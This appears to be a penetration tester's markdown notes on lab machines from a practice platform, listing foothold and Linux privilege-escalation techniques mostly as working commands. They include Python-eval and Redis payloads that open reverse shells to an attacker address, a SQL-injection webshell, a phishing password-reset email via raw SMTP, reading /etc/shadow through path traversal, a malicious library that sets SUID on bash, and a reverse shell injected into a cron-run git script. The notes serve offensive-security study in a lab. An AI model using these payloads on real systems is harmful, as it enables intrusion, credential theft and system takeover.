
| [[14 Proving Grounds Methods#Initial Foothold\|Initial Foothold]] | [[14 Proving Grounds Methods#Linux Privilege Escalation\|Linux Privilege Escalation]] |     |
| ----------------------------------------------------------------- | ------------------------------------------------------------------------------------- | --- |
|                                                                   |                                                                                       |     |


## Initial Foothold
- Look for any services/software and lookup their version number on EDB (Reference: ZenPhoto)
```shell
# Found version number in HTML document comment
kali@kali:~$ searchsploit "zenphoto 1.4.1.4"
kali@kali:~$ searchsploit -m 18083
kali@kali:~$ php 18083.php  192.168.142.41 /test/
```
- If HTTP Header says "Werkzeug/1.0.1 (Python 3.6.8)", and mentions "code" or attempts to evaluate something (Reference: hetemit)
```shell
# First attempt basic evaluation
curl -i http://192.168.142.117:5000/verify -X POST --data 'code=5*5'

# Then check if Python os package is imported
http://192.168.142.117:5000/verify -X POST --data 'code=os.system("whoami")'
# If returns code 0, means no errors

# Run your reverse shell from here
http://192.168.142.117:5000/verify -X POST --data 'code=os.system("nc 192.168.45.154 18000 -e /bin/bash")'
```
- If id_rsa is found, attempt ssh connection with other users, including root (Reference: Clue)
```shell
# Read and manually copy id_rsa to Kali
cassie@clue:/$ cat id_rsa

# SSH into multiple users, after setting proper rights on id_rsa
kali@kali:~$ chmod 600 id_rsa
kali@kali:~$ ssh -i id_rsa anthony@192.168.181.240 # fail
kali@kali:~$ ssh -i id_rsa cassie@192.168.181.240 # fail
kali@kali:~$ ssh -i id_rsa root@192.168.181.240 # success!
```
- Use SMTP to send phishing email e.g. Password Reset (Reference: Postfish)
```shell
# Assumed that usernames were enumerated beforehand, refer to 02 Enumeration: SMTP
# Bruteforce login credentials via pop3
kali@kali:~$ hydra -L pop_usernames.txt -P pop_passwords.txt <IP> pop3 -V -f

# Login to Pop3 to retrieve mail
kali@kali:~$ telnet <IP> 110
telnet> USER sales
+OK
telnet> PASS sales
+OK Logged in.
telnet> LIST
+OK 1 messages:
1 683
.
telnet> RETR 1

# Send Password Reset Phishing Mail
kali@kali:~$ nc -nv <IP> 25
telnet> helo postfish.off
250 postfish.off
telnet> MAIL FROM: it@postfish.off
250 2.1.0 Ok
telnet> RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
telnet> DATA
354 End data with <CR><LF>.<CR><LF>
telnet> Subject: Password Reset
telnet> reset password at this link <http://192.168.45.147/>
telnet> .
250 2.0.0 Ok: queued as 048374543F
telnet> QUIT
221 2.0.0 Bye

# Listener on Port 80
kali@kali:~$ rlwrap nc -nvlp 80
listening on [any] 80 ...  
connect to [192.168.58.200] from (UNKNOWN) [192.168.58.137] 37158  
POST / HTTP/1.1  
Host: 192.168.58.200  
User-Agent: curl/7.68.0  
Accept: */*  
Content-Length: 207  
Content-Type: application/x-www-form-urlencodedfirst_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
# brian.moore:EternaLSunshinE
```
- Use vulnerable SQL query to upload a webshell (Reference: Hawat)
```shell
# Test for SQLi with time injection
/issue/checkByPriority?priority='+union+select+sleep(5)+--+-
'# ignore this

# Then try to upload a file to the DOCUMENT_ROOT of the web server (check phpinfo.php if have)
/issue/checkByPriority?priority=' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -
'# ignore this again

# Navigate to the page and utilize webshell to rev shell
kali@kali:~$ curl http://192.168.166.147:30455/shell.php?cmd=whoami
```
- Use Redis to run commands and start a reverse shell if RCE exploit.py doesn't work (Reference: Sybaris)
```shell
# FTP in and connect as anonymous
kali@kali:~$ ftp 192.168.210.93

# Put the malicious module file in the system
ftp> cd pub
ftp> put exp_lin.so

# Load module with Redis-Cli and Start reverse shell
kali@kali:~$ penelope 6379
kali@kali:~$ redis-cli -h 192.168.210.93
redis> MODULE LOAD /var/ftp/pub/exp_lin.so
redis> system.exec "bash -i >& /dev/tcp/192.168.45.155/6379 0>&1"
```
## Linux Privilege Escalation
- Use `/usr/bin/dosbox` to edit /etc/sudoers file (Reference: Nukem)
```shell
http@nukem:/$ LFILE='/etc/sudoers'
http@nukem:/$ /usr/bin/dosbox -c 'mount c /' -c "echo http ALL=(ALL) NOPASSWD: ALL>>c:$LFILE" -c exit
http@nukem:/$ sudo su
```
- Use existing sudo -l commands to privilege escalate (Reference: Clue)
```shell
# Use existing sudo privileges to run cassandra web as root
cassie@clue:/$ sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:9999 -u cassie -p SecondBiteTheApple330

# Check running
cassie@clue:/$ netstat -tulpn
cassie@clue:/$ ss -ntlpu

# If can't access from Kali, access locally
cassie@clue:/$ curl 0.0.0.0:9999

# Use existing LFI vulnerability on the now root-run cassandra web to read id_rsa or etc/shadow
cassie@clue:/$ curl --path-as-is http://0.0.0.0:9999/../../../../../../../../../etc/shadow
```
- Different users may have different sudo commands/privileges that can be abused (Reference: Postfish)
```shell
# Intial access as brian.moore
brian.moore@postfish:~$ id
uid=1000(brian.moore) gid=100(brian.moore)
groups=1000(brian.moore),8(mail),997(filter)

# Get a reverse shell as filter via /etc/postfix/disclaimer
brian.moore@postfish:~$ cat /etc/postfix/disclaimer # owned by root, readable AND writable by us

# Check sudo privileges of filter user
filter@postfish:/var/spool/postfix$ sudo -l
(ALL) NOPASSWD: /usr/bin/mail *

# Refer to GTFOBins to PrivEsc
```
- Give GLOBAL sudo commands to SU to root (Reference: pc)
```shell
user@pc:/tmp$ cat cve-2022-35411.py
# exec_command('echo "user ALL=(root) NOPASSWD: ALL" > /etc/suoders')

user@pc:/tmp$ chmod +x cve-2022-35411.py
user@pc:/tmp$ python3 cve-2022-35411.py
user@pc:/tmp$ sudo -l
```
- Use missing library file to give /bin/bash a SUID bit to run as root (Reference: Sybaris)
```shell
# Write malicious library file
pablo@sybaris:/tmp$ vi test.c
#include <stdio.h>  
#include <unistd.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
static void inject() __attribute__((constructor));  
  
void inject(){  
setuid(0);  
setgid(0);  
printf("I'm the bad library\n");  
system("chmod +s /bin/bash");  
}

# Compile and put the file in the LD_LIBRARY_PATH
pablo@sybaris:/tmp$ gcc -o /usr/local/lib/dev/utils.so -shared -fPIC test.c

# Wait for root to run its cron job and call the library file
pablo@sybaris:/tmp$ ls -la /bin/bash

# Priv Esc once SUID bit is set
pablo@sybaris:/tmp$ bash -p
```
- Use git-shell user to fetch, review, and edit git repo that has a crontab task (Reference: Hunit)
```shell
### Found various hints to a git server
[dademola@hunit ~]$ ls /
# git-server folder in /
[dademola@hunit ~]$ cat /etc/crontab.bak
#*/3 * * * * /root/git-server/backups.sh
#*/2 * * * * /root/pull.sh

# Only found Git backend files in /git-server, try clone
[dademola@hunit ~]$ git clone file:///git-server/
[dademola@hunit ~]$ cd git-server
[dademola@hunit ~]$ git log
[dademola@hunit ~]$ cat backups.sh

# Try to edit and commit a change
[dademola@hunit ~]$ echo "bash -c 'bash -i >& /dev/tcp/192.168.45.167/18030 0>&1'" >> backups.sh
[dademola@hunit ~]$ chmod +x backups.sh
[dademola@hunit ~]$ git add -A
[dademola@hunit ~]$ git commit -m "pwn"
[dademola@hunit ~]$ git push origin master
# Failed because no permissions, but got git user!

# Clone repo on Kali
kali@kali:~$ GIT_SSH_COMMAND='ssh -i git_id_rsa -p 43022' git clone git@192.168.236.125:/git-server

# Configure Git Identity
kali@kali:~$ cd git-server
kali@kali:~/git-server$ git config --global user.name "kali"
kali@kali:~/git-server$ git config --global user.email "kali@kali.(none)"

# Inject payload and make it executable
kali@kali:~/git-server$ echo "bash -c 'bash -i >& /dev/tcp/192.168.45.167/18030 0>&1'" >> backups.sh 
kali@kali:~/git-server$ chmod +x backups.sh

# Add and Commit
kali@kali:~$ git add -A
kali@kali:~$ git commit -m "pwn"

# Push via SSH into Git user
kali@kali:~$ GIT_SSH_COMMAND='ssh -i ~/git_id_rsa -p 40322' git push origin master

# Setup listener
kali@kali:~$ nc -nvlp 18030
```